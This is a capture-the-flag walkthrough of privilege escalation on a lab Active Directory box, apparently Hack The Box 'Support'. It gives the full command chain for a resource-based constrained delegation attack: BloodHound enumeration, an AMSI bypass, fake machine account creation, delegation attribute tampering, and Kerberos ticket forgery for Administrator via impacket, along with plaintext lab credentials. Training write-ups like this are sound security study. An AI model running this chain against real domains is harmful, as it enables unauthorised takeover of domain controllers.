## Privilege Escalation
Lets first list all information about our current user.
```powershell
whoami /all
```
![](screenshots/Pasted%20image%2020220826224310.png)
We can see that we are a member of the custom group `Shared Support Accounts` so lets proceed by downloading and running `SharpHound`.
```powershell
upload /opt/BloodHound/Collectors/SharpHound.exe
./SharpHound.exe
```
Once complete, we can download the newly created zip file.
```powershell
download C:\ProgramData\20220826204835_BloodHound.zip bh.zip
```
Now lets analyze in BloodHound.
```bash
sudo neo4j console
bloodhound
```
In BloodHound, we can select our user `SUPPORT@SUPPORT.HTB` and marked it as owned. From here we can select `Node Info`, and then `Transitive Object Control` to see what objects we have control over.
![](screenshots/Pasted%20image%2020220827002416.png)
Bloodhound reveals that one of the groups we are a member of (`Shared Support Accounts`) has `GenericAll` over `DC.SUPPORT.HTB` so we can perform a **resource based constrained delegation attack** according to the [BloodHound Wiki](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html).
According to the guide, we will need `Powermad`, so we will restart our `evil-winrm` connection with `Powermad` as an imported script.
```bash
mkdir scripts
cp /opt/Powermad/Powermad.ps1 scripts
evil-winrm -i 10.129.49.99 -u support -p Ironside47pleasure40Watchful -s scripts
```
We then need to initialize `Powermad`.
```powershell
Bypass-4MSI
Powermad.ps1
```
We then are able to make a new fake machine account.
```powershell
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'password123' -AsPlainText -Force)
```
![](screenshots/Pasted%20image%2020220827010912.png)
When trying to get the new machine's SID, Get-DomainComputer was not found, so we also need to import `PowerView` and restart our `evil-winrm` connection.
```bash
cp /opt/PowerSploit/Recon/PowerView.ps1 scripts
evil-winrm -i 10.129.49.99 -u support -p Ironside47pleasure40Watchful -s scripts
Bypass-4MSI
Powermad.ps1
PowerView.ps1
```
From here, we can continue with exploitation by retrieving the SID of the new machine.
```powershell
$ComputerSid = Get-DomainComputer FAKE01 -Properties objectsid | Select -Expand objectsid
```
We can then create a raw security descriptor for the `FAKE01` computer principal ([reference](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)).
```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```
We can then apply the raw security descriptor to the target machine `dc`.
```powershell
Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```
![](screenshots/Pasted%20image%2020220827010819.png)
From here, we can use `impacket-getST` to create a Kerberos ticket to authenticate to the machine with as Administrator.
```bash
impacket-getST support.htb/FAKE01:password -dc-ip $ip -impersonate Administrator -spn www/dc.support.htb
```
![](screenshots/Pasted%20image%2020220827011459.png)
We can then use this ticket to authenticate to the box as administrator via `impacket-psexec`.
```bash
export KRB5CCNAME=$PWD/Administrator.ccache
impacket-psexec support.htb/Administrator@dc.support.htb -k -no-pass
```
![](screenshots/Pasted%20image%2020220827011732.png)

---
[proof](proof.md)